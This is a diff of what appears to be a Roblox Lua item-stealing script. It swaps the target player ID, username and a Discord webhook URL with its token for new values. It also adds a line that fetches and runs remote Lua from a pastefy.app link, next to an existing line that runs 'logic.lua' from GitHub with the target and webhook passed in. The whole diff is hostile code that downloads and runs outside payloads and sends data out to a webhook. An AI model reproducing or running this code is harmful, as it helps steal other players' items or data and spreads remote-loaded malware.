@@ -1,6 +1,6 @@
-local TARGET_ID = 10541897671
-local TARGET_USER = "roblox_user_10541897671"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1571284272566763632/ndXL8LOqaQDlV86XCDIQLWA5SiN3gxTM1CHDRO-WQTnsthXOU-Q52-LoNZWPS2y2sZtd"
+local TARGET_ID = 631629099
+local TARGET_USER = "BraxtonDoodle143"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1571528825525772438/RrbpHFGcauWV3oh3_VfTzp-rh6VdVvvZxeN_2EmUzlcGz0Jdswma8Wk2RXy_EHi6Gqrq"
 
 local TargetBrainrots = {
     ["Dragon Skeletonini"] = true,
@@ -350,6 +350,10 @@ task.spawn(function()
 end)
 
 task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
+
+    task.wait(1)
+
     local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
     if type(script) == "function" then
         script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
